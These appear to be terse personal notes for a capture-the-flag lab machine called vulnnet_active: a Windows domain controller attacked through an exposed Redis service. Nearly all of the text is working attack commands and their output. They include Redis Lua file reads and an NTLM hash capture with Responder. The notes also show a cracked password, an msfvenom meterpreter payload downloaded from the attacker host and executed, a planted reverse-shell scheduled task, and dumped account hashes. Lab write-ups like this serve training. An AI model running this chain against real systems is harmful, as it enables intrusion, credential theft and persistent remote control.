2022-07-05
vulnnet_active

# gryNet

TARGET = 10.10.56.53

53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
464/tcp open  kpasswd5

# enum4linux $IP

	Domain Name:
	VULNNET
	Domain Sid:
	S-1-5-21-1405206085-1650434706-76331420

# crackmapexec smb $IP
VULNNET-BC3TCK1

domain: vulnnet.local
VULNNET-BC3TCK1
Windows 10.0 Build 17763 x64 
(name:VULNNET-BC3TCK1) 
(domain:vulnnet.local)
(signing:True) (SMBv1:False)


# redis-cli -h $IP 
INFO
CONFIG GET *
CONFIG GET dir
C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402

# redis-cli -h $IP -p 6379 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0

3eb176aee96432d5b100bc93580b291e
wrap in THM{}

# responder -I tun0
# redis-cli -h $IP -p 6379 eval "dofile('//$LOCAL-IP//share')" 0

VOILA!
enterprise-security::VULNNET:74ee5d651f7f00d3:4DC680ED9E7F263FEA73AFA82A144D09:010100000000000080340FB6C090D80128423B6E3F1C04C6000000000200080031005A003600500001001E00570049004E002D0059004300430033005A00560055004A0031003100310004003400570049004E002D0059004300430033005A00560055004A003100310031002E0031005A00360050002E004C004F00430041004C000300140031005A00360050002E004C004F00430041004C000500140031005A00360050002E004C004F00430041004C000700080080340FB6C090D801060004000200000008003000300000000000000000000000003000003588DB363B091FC14D24A98CAC6F37C11EBFDA7E16BC559943EB161FB00403BA0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310038002E00360030002E003100320037000000000000000000

# hashcat -m 5600 ntml.hash rockyou.txt
> sand_0873959498

# evil-winrm -i $IP -u 'enterprise-security' -p 'sand_0873959498'

# smbclient -L \\$IP -U enterprise-security
> enter password

ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Enterprise-Share Disk      
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 

found ps1 script as schedueled task.
put ps-revshell oneliner
put > 

# LOCAL ENUMERATION

Get-ExecutionPolicy
> RemoteSigned
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
> Unrestricted

# Get-MpComputerStatus
NO-AV

# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.18.60.127 LPORT=444 -f exe > rev.exe

loadup http.server
# wget http://10.18.60.127:8000/rev.exe -OutFile rev.exe; ./rev.exe

>session 1 opened.
>getprivs
>getsystem
>hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66d7c6f99b03f0d7f520e1e0e55f9149:::
enterprise-security:1103:aad3b435b51404eeaad3b435b51404ee:41ab3f4e60ca2215f8ae1b79b23edc10:::
jack-goldenhand:1104:aad3b435b51404eeaad3b435b51404ee:0f27eaa88eeed8637b2f38d0f2c8dab4:::
tony-skid:1105:aad3b435b51404eeaad3b435b51404ee:aadd887bcc436ae6787c876f3bf118fe:::
VULNNET-BC3TCK1$:1000:aad3b435b51404eeaad3b435b51404ee:dca29474466c42dc22067cf732f585a5:::

# flags
user.txt:THM{3eb176aee96432d5b100bc93580b291e}
system.txt:THM{d540c0645975900e5bb9167aa431fc9b}



schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /create /sc minute /mo 1 /tn "ReverseShell" /tr C:\Users\enterprise-security\Downloads\rev.exe

Start-ScheduledTask -TaskName "ScanSoftware"
